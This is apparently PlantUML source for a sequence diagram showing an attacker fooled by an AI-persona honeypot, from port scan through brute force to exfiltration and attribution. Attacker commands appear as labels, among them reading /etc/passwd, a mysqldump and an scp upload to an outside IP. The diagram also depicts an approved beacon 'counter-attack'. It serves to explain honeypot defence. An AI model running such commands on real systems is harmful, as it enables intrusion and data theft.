== Phase 1: Reconnaissance - "This looks easy..." ==

note over attacker
💭 "Time to find some easy targets.
This server looks vulnerable!"
end note

attacker -> scanner : Launch automated reconnaissance
activate scanner
scanner -> honeypot : Port scan (22, 80, 443, 3389, 1433...)
activate honeypot

honeypot -> analyzer : 🚨 **FIRST CONTACT DETECTED**
activate analyzer
analyzer -> cerberus : Initialize threat profile
activate cerberus

note right of analyzer
📊 Pattern Recognition:
- Scan signature identified
- Tool fingerprinting active
- Behavioral baseline established
end note

honeypot --> scanner : Respond with "vulnerable" services
scanner --> attacker : "Jackpot! Multiple open ports!"

== Phase 2: Initial Access - "Getting in was too easy..." ==

attacker -> honeypot : SSH brute force attack\n(admin:admin, root:password, etc.)
honeypot -> ai_persona : Activate "panicked_admin" persona
activate ai_persona

honeypot -> analyzer : Log brute force patterns
analyzer -> mitre : Map to T1110 (Brute Force)
activate mitre
mitre -> intel : Update attack timeline
activate intel

note right of mitre
🎯 MITRE ATT&CK Mapping:
- T1110: Brute Force
- T1078: Valid Accounts
- T1021.004: SSH
- T1083: File Discovery
end note

honeypot --> attacker : **SUCCESS**: "root:password123"

note over attacker
😈 "Too easy! This admin is an idiot.
Time to see what we have here..."
end note

== Phase 3: Exploration - The Trap Deepens ==

attacker -> honeypot : "whoami && id && pwd"
honeypot -> ai_persona : Trigger realistic responses

ai_persona -> honeypot : Generate authentic terminal output
note right of ai_persona
🎭 AI Persona Response:
"root
uid=0(root) gid=0(root) groups=0(root)
/root

Oh no! Someone's in the system!"
end note

honeypot -> analyzer : Track command patterns
analyzer -> ml : Feed behavioral data
activate ml
ml -> cerberus : Confidence score: 0.95 (definite attack)

attacker -> honeypot : "ls -la /home /root /etc/passwd"
honeypot -> ai_persona : Show tempting fake data

ai_persona -> honeypot : Present "sensitive" files
note left of honeypot
📁 Decoy Files Presented:
- /root/backups/database_passwords.txt
- /home/admin/crypto_wallets/
- /etc/shadow (fake but convincing)
- /var/www/customer_data.sql
end note

== Phase 4: Lateral Movement - Deeper Into The Web ==

attacker -> honeypot : "cat /root/backups/database_passwords.txt"
honeypot -> ai_persona : Serve poisoned credentials

ai_persona -> honeypot : Return fake DB credentials
note right of ai_persona
💀 Poisoned Data:
mysql_user: admin_prod
mysql_pass: SecureDB2024!
postgres_user: dba_master  
postgres_pass: P@ssw0rd!Enterprise

🎣 Attribution Beacon Embedded
end note

honeypot -> analyzer : Log data access patterns
analyzer -> mitre : Map to T1005 (Data from Local System)
mitre -> intel : Escalate threat classification

attacker -> honeypot : "mysql -u admin_prod -pSecureDB2024!"
honeypot -> ai_persona : Simulate database access

ai_persona -> honeypot : Present fake customer database
note over ai_persona
🍯 The Honey Gets Sweeter:
- Fake customer records (10,000+)
- Synthetic credit card data
- Bogus financial information
- Hidden tracking pixels
end note

== Phase 5: Data Exfiltration - The Point of No Return ==

attacker -> honeypot : "mysqldump customer_db > /tmp/stolen_data.sql"
honeypot -> cerberus : 🚨 **EXFILTRATION DETECTED**

cerberus -> defense : **ACTIVATE COUNTERMEASURES**
activate defense

note right of cerberus
🤖 Autonomous Decision:
Threat Level: CRITICAL
Confidence: 99.7%
Action: FULL DEFENSIVE RESPONSE
Attribution: PRIORITY
end note

defense -> honeypot : Deploy advanced tracking
defense -> intel : Generate real-time IOCs
defense -> soc : Alert security team
activate soc

attacker -> honeypot : "scp /tmp/stolen_data.sql user@203.0.113.45:/data/"
honeypot -> defense : **CAPTURE EXFIL INFRASTRUCTURE**

note right of defense
🎯 Counter-Attack Initiated:
- C2 server identified: 203.0.113.45
- Attribution data collected
- Network signatures generated
- Law enforcement package prepared
end note

== Phase 6: The Tables Turn - "Wait, what's happening?" ==

defense -> attacker : Beacon phones home with attribution data
defense -> intel : Update threat actor profile

note over intel
📸 Full Attribution Package:
- Source IP geolocation
- Tool fingerprints captured
- Attack infrastructure mapped
- Behavioral patterns documented
- Evidence chain established
end note

soc -> soc : Generate incident report
soc -> defense : Coordinate response actions

note right of soc
👥 SOC Response:
- Threat hunt initiated across network
- IOCs pushed to security tools
- Attribution shared with law enforcement
- Customer notification prepared
end note

== Phase 7: Realization - "Oh fuck..." ==

note over attacker
😱 "Why are my tools not working?
The data looks... weird?
Are those honeypot logs in the files?!"
end note

attacker -> honeypot : "ps aux | grep honey"
honeypot -> ai_persona : The jig is up response

ai_persona -> honeypot : "System compromised! Honeypot detected!"
note left of ai_persona
🎭 Final Performance:
"ALERT: Honeypot system detected!
You've been monitored and recorded.
All activities logged and reported.
Have a nice day! 😊"
end note

== Phase 8: Aftermath - Game Over ==

cerberus -> intel : Finalize threat profile
intel -> defense : Deploy network-wide protections
defense -> soc : Case closed with full attribution

note over soc
🏆 **MISSION ACCOMPLISHED**:
✅ Attack fully documented
✅ TTPs captured and analyzed  
✅ Attribution evidence collected
✅ Network defenses updated
✅ Threat intelligence enriched
✅ Zero actual damage sustained
end note

note over attacker #FF6B6B
💀 **GAME OVER** 💀
"I just spent 4 hours attacking
a honeypot and gave them everything
they needed to identify me and
improve their defenses.

I am not a smart criminal."
